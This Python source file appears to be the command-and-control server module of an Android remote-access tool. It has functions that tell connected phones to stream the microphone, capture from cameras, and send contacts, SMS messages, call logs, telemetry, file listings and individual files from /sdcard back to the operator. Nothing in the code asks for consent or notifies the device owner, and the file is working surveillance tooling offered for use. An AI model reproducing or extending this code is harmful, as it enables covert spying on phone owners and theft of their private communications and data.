import asyncio
import json
from typing import Any, Dict, Optional

from app.config import settings
from app.logger import log_info, log_warn
from app.protocol import send_frame
from app.state import state, ClientSession
from app.tcp.dispatcher import register_pending


def _get_target_client(client_id: Optional[str] = None) -> Optional[ClientSession]:
    if client_id:
        return state.get_client(client_id)
    return state.get_active_client()


async def send_command(cmd: dict, client_id: Optional[str] = None) -> None:
    client = _get_target_client(client_id)
    if client is None or client.writer is None or client.writer.is_closing():
        return
    await send_frame(client.writer, json.dumps(cmd).encode())


async def cmd_disconnect(client_id: Optional[str] = None) -> Dict[str, str]:
    client = _get_target_client(client_id)
    if client is None or not client.is_connected():
        return {"status": "no_client"}
    cid = client.id
    try:
        await send_command({"cmd": "disconnect"}, client_id=cid)
    except Exception:
        pass
    writer = client.writer
    if writer:
        try:
            writer.close()
        except Exception:
            pass
    try:
        await asyncio.wait_for(client.disconnect_event.wait(), timeout=2.0)
    except asyncio.TimeoutError:
        state.remove_client(cid)
    log_info(f"client {cid} disconnected via command")
    return {"status": "disconnected"}


async def cmd_use_mic(client_id: Optional[str] = None) -> Dict[str, str]:
    client = _get_target_client(client_id)
    if client is None or not client.is_connected():
        return {"status": "no_client"}
    if client.mic_active:
        return {"status": "already_active"}
    client.mic_active = True
    try:
        await send_command({"cmd": "use_mic"}, client_id=client.id)
        log_info(f"mic stream requested for {client.id}")
        return {"status": "started"}
    except Exception as e:
        client.mic_active = False
        log_warn(f"failed to request mic: {e}")
        return {"status": "error", "message": str(e)}


async def cmd_stop_mic(client_id: Optional[str] = None) -> Dict[str, str]:
    client = _get_target_client(client_id)
    if client:
        client.mic_active = False
        if client.is_connected():
            try:
                await send_command({"cmd": "stop_mic"}, client_id=client.id)
            except Exception:
                pass
        log_info(f"mic stream stopped for {client.id}")
    return {"status": "stopped"}


async def cmd_get_contacts(client_id: Optional[str] = None) -> Dict[str, Any]:
    client = _get_target_client(client_id)
    if client is None or not client.is_connected():
        return {"status": "no_client", "path": None}
    fut = register_pending("contacts", client_id=client.id)
    try:
        await send_command({"cmd": "get_contacts"}, client_id=client.id)
        res = await asyncio.wait_for(fut, timeout=25.0)
        return res
    except asyncio.TimeoutError:
        return {"status": "timeout", "path": None}
    except asyncio.CancelledError:
        return {"status": "cancelled", "path": None}
    except Exception as e:
        return {"status": "error", "message": str(e), "path": None}


async def cmd_get_sms(hours: int = 24, client_id: Optional[str] = None) -> Dict[str, Any]:
    client = _get_target_client(client_id)
    if client is None or not client.is_connected():
        return {"status": "no_client", "data": []}
    fut = register_pending("sms", client_id=client.id)
    try:
        await send_command({"cmd": "get_sms", "hours": hours}, client_id=client.id)
        res = await asyncio.wait_for(fut, timeout=25.0)
        return res
    except asyncio.TimeoutError:
        return {"status": "timeout", "data": []}
    except asyncio.CancelledError:
        return {"status": "cancelled", "data": []}
    except Exception as e:
        return {"status": "error", "message": str(e), "data": []}


async def cmd_get_call_logs(hours: int = 24, client_id: Optional[str] = None) -> Dict[str, Any]:
    client = _get_target_client(client_id)
    if client is None or not client.is_connected():
        return {"status": "no_client", "data": []}
    fut = register_pending("call_logs", client_id=client.id)
    try:
        await send_command({"cmd": "get_call_logs", "hours": hours}, client_id=client.id)
        res = await asyncio.wait_for(fut, timeout=25.0)
        return res
    except asyncio.TimeoutError:
        return {"status": "timeout", "data": []}
    except asyncio.CancelledError:
        return {"status": "cancelled", "data": []}
    except Exception as e:
        return {"status": "error", "message": str(e), "data": []}


async def cmd_list_cams(client_id: Optional[str] = None) -> Dict[str, Any]:
    if not settings.enable_camera:
        return {"status": "disabled", "message": "Camera feature is disabled", "data": []}
    client = _get_target_client(client_id)
    if client is None or not client.is_connected():
        return {"status": "no_client", "data": []}
    fut = register_pending("cams", client_id=client.id)
    try:
        await send_command({"cmd": "list_cams"}, client_id=client.id)
        res = await asyncio.wait_for(fut, timeout=15.0)
        return res
    except asyncio.TimeoutError:
        return {"status": "timeout", "data": []}
    except asyncio.CancelledError:
        return {"status": "cancelled", "data": []}
    except Exception as e:
        return {"status": "error", "message": str(e), "data": []}


async def cmd_use_cam(cam_id: str, client_id: Optional[str] = None) -> Dict[str, Any]:
    if not settings.enable_camera:
        return {"status": "disabled", "message": "Camera feature is disabled", "path": None}
    client = _get_target_client(client_id)
    if client is None or not client.is_connected():
        return {"status": "no_client", "path": None}
    fut = register_pending("camera_capture", client_id=client.id)
    try:
        await send_command({"cmd": "use_cam", "cam_id": str(cam_id)}, client_id=client.id)
        res = await asyncio.wait_for(fut, timeout=25.0)
        return res
    except asyncio.TimeoutError:
        return {"status": "timeout", "path": None}
    except asyncio.CancelledError:
        return {"status": "cancelled", "path": None}
    except Exception as e:
        return {"status": "error", "message": str(e), "path": None}


async def cmd_get_telemetry(client_id: Optional[str] = None) -> Dict[str, Any]:
    client = _get_target_client(client_id)
    if client is None or not client.is_connected():
        return {"status": "no_client", "data": None}
    fut = register_pending("telemetry", client_id=client.id)
    try:
        await send_command({"cmd": "get_telemetry"}, client_id=client.id)
        res = await asyncio.wait_for(fut, timeout=20.0)
        return res
    except asyncio.TimeoutError:
        return {"status": "timeout", "data": None}
    except asyncio.CancelledError:
        return {"status": "cancelled", "data": None}
    except Exception as e:
        return {"status": "error", "message": str(e), "data": None}


async def cmd_list_files(path: str = "/sdcard", client_id: Optional[str] = None) -> Dict[str, Any]:
    client = _get_target_client(client_id)
    if client is None or not client.is_connected():
        return {
            "status": "no_client",
            "message": "No Android client connected",
            "path": path,
            "files": state.files_tree,
            "data": state.files_tree,
        }
    fut = register_pending("files", client_id=client.id)
    try:
        await send_command({"cmd": "list_files", "path": path, "depth": 2}, client_id=client.id)
        res = await asyncio.wait_for(fut, timeout=20.0)
        return res
    except asyncio.TimeoutError:
        return {
            "status": "timeout",
            "message": "Android client timed out",
            "path": path,
            "files": state.files_tree,
            "data": state.files_tree,
        }
    except asyncio.CancelledError:
        return {"status": "cancelled", "files": [], "data": []}
    except Exception as e:
        return {"status": "error", "message": str(e), "files": [], "data": []}


async def cmd_download_file(file_path: str, client_id: Optional[str] = None) -> Dict[str, Any]:
    client = _get_target_client(client_id)
    if client is None or not client.is_connected():
        return {"status": "no_client", "data": None}
    fut = register_pending("file_download", client_id=client.id)
    try:
        await send_command({"cmd": "download_file", "path": file_path}, client_id=client.id)
        res = await asyncio.wait_for(fut, timeout=25.0)
        return res
    except asyncio.TimeoutError:
        return {"status": "timeout", "data": None}
    except asyncio.CancelledError:
        return {"status": "cancelled", "data": None}
    except Exception as e:
        return {"status": "error", "message": str(e), "data": None}

